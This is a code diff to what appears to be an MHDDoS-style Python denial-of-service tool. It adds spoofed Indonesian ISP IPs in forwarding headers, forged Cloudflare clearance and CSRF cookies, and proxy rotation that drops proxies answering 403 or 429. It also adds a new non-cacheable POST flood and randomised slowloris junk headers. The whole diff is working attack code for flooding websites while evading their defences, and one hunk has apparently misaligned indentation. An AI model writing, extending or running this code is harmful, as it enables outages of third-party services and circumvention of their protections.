@@ -264,6 +264,18 @@ class Tools:
     protocolRex = compile('"protocol":(\\d+)')
     
     @staticmethod
+    def get_random_indo_ip():
+        # [NEW] Generate Indonesian Residential IPs (Telkomsel, Indihome, XL)
+        ranges = [
+            "114.124.{}.{}", "182.253.{}.{}", # Telkomsel
+            "180.244.{}.{}", "125.160.{}.{}", # Indihome
+            "112.215.{}.{}", # XL
+            "139.192.{}.{}" # More Indihome
+        ]
+        chosen = randchoice(ranges)
+        return chosen.format(randint(0, 255), randint(1, 254))
+    
+    @staticmethod
     def crawl(url_str):
         # [NEW] Active Reconnaissance - Scrape for Real Paths
         try:
@@ -556,8 +568,8 @@ class Layer4(Thread):
                         conn_type=AF_INET,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
-        if self._proxies:
-            s = randchoice(self._proxies).open_socket(
+        if self._proxy_cycle:
+            s = next(self._proxy_cycle).open_socket(
                 conn_type, sock_type, proto_type)
         else:
             s = socket(conn_type, sock_type, proto_type)
@@ -1003,7 +1015,13 @@ class HttpFlood(Thread):
             platform = "\"Linux\""
             mobile = "?0"
 
+        cookies = f"Cookie: _ga=GA1.1.{randint(1000000, 9999999)}.{randint(1000000000, 2000000000)}; cf_clearance={ProxyTools.Random.rand_str(43)}; csrftoken={ProxyTools.Random.rand_str(32)}\r\n"
+        
         headers = (
+            f"X-Forwarded-For: {Tools.get_random_indo_ip()}\r\n"
+            f"X-Real-IP: {Tools.get_random_indo_ip()}\r\n"
+            f"Client-IP: {Tools.get_random_indo_ip()}\r\n"
+            f"{cookies}"
             f"Sec-Fetch-Dest: document\r\n"
             f"Sec-Fetch-Mode: navigate\r\n"
             f"Sec-Fetch-Site: none\r\n"
@@ -1170,7 +1188,16 @@ class HttpFlood(Thread):
                            f"Content-Type: application/json\r\n\r\n"
                            f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                 
-                Tools.send(s, payload.encode("utf-8"))
+                # [NEW] Status Tracker (Sniffer)
+            try:
+                # Peek at the response (first 20 bytes)
+                response_start = s.recv(20).decode('utf-8', errors='ignore')
+                if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                    status_code = response_start.split(" ")[1]
+                    print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Server Response Received")
+            except: pass # Non-blocking or incomplete response
+            
+            Tools.send(s, payload.encode("utf-8"))
         except Exception as e:
             err = str(e)
             if "timed out" in err or "Timeout" in err:
@@ -1365,14 +1392,11 @@ class HttpFlood(Thread):
 
     def DYN(self):
         # [OPTIMIZED] Dynamic Host + Dynamic Path
-        # Previous: Static path, Dynamic Host
-        # New: Random Path + Random Subdomain + Consistent Headers
         path = self.get_random_target_path()
         ua = randchoice(self._useragents)
         headers = self.build_consistent_headers(ua)
         
         request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
-        # Dynamic Subdomain Host
         host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
         
         payload: Any = (f"{request_line}"
@@ -1388,20 +1412,58 @@ class HttpFlood(Thread):
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
-                    pass
+                    # [NEW] Status Tracker (Sniffer) + Auto Reconnect
+                    try:
+                        response_start = s.recv(20).decode('utf-8', errors='ignore')
+                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                            status_code = response_start.split(" ")[1]
+                            print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] DYN: Server Response")
+                            if status_code in {"403", "429"}:
+                                raise Exception("Proxy Blocked")
+                    except Exception as e:
+                        if "Blocked" in str(e): raise e
+                        pass
         except Exception as e:
-            err = str(e)
-            if "timed out" in err or "Timeout" in err:
-                # print(f"[DEBUG] DYN: Connection Timeout (Target Lagging/Down)")
-                pass
-            elif "[Errno 111]" in err or "Connection refused" in err:
-                pass
-            elif "[Errno 104]" in err or "Reset by peer" in err:
-                pass
-            elif "Broken pipe" in err:
-                pass
-            else:
-                pass
+            pass
+        Tools.safe_close(s)
+
+    def POST_DYN(self):
+        # [PHASE 2] Non-Cacheable POST Flood
+        path = self.get_random_target_path()
+        ua = randchoice(self._useragents)
+        headers = self.build_consistent_headers(ua)
+        
+        # Build JSON Payload (500-1000 bytes)
+        json_data = f'{{"id": "{uuid4()}", "data": "{ProxyTools.Random.rand_str(randint(500, 1000))}"}}'
+        
+        payload = (f"POST {path} HTTP/1.1\r\n"
+                   f"Host: {self._target.authority}\r\n"
+                   f"User-Agent: {ua}\r\n"
+                   f"{headers}"
+                   f"Content-Type: application/json\r\n"
+                   f"Content-Length: {len(json_data)}\r\n\r\n"
+                   f"{json_data}").encode("utf-8")
+        s = None
+        try:
+            s = self.open_connection()
+            global CONNECTIONS_SENT
+            CONNECTIONS_SENT += 1
+            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Non-Cacheable Packet Sent")
+            for _ in range(self._rpc):
+                if Tools.send(s, payload):
+                    # Status Sniffer
+                    try:
+                        response_start = s.recv(20).decode('utf-8', errors='ignore')
+                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                            status_code = response_start.split(" ")[1]
+                            print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] POST_DYN: Response")
+                            if status_code in {"403", "429"}:
+                                raise Exception("Proxy Blocked")
+                    except Exception as e:
+                        if "Blocked" in str(e): raise e
+                        pass
+        except:
+            pass
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
@@ -1590,6 +1652,11 @@ class HttpFlood(Thread):
                 # if s.recv(1): ... this blocks.
                 
                 for i in range(self._rpc):
+                    # [NEW] Indonesian ISP Randomized Junk Header
+                    junk_key = randchoice(["X-ISP", "X-Sponsor", "X-Route", "X-Provider"])
+                    junk_val = randchoice(["Telkomsel", "Indihome", "XL-Axiata", "Biznet", "FirstMedia"])
+                    Tools.send(s, (f"{junk_key}: {junk_val}\r\n").encode("utf-8"))
+                    
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
@@ -2351,17 +2418,13 @@ if __name__ == '__main__':
             event.set()
             ts = time()
             while time() < ts + timer:
-                logger.debug(
-                    f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
-                    (target or url.host,
-                     port or (url.port or 80),
-                     method,
-                     Tools.humanformat(int(REQUESTS_SENT)),
-                     Tools.humanbytes(int(BYTES_SEND)),
-                     round((time() - ts) / timer * 100, 2)))
+                # [PHASE 2] Visual PPS & BPS Stats
+                print(
+                    f'\r{bcolors.WARNING}Target:{bcolors.OKBLUE} {target or url.host}{bcolors.WARNING} | Speed:{bcolors.OKGREEN} {Tools.human_format(int(REQUESTS_SENT), "PPS")}{bcolors.WARNING} | Data:{bcolors.OKBLUE} {Tools.human_format(int(BYTES_SEND), "Bps")}{bcolors.WARNING} | Progress: {bcolors.OKCYAN}{round((time() - ts) / timer * 100, 2)}%{bcolors.RESET}', end="")
                 REQUESTS_SENT.set(0)
                 BYTES_SEND.set(0)
                 sleep(1)
+            print("\n")
 
             event.clear()
             exit()
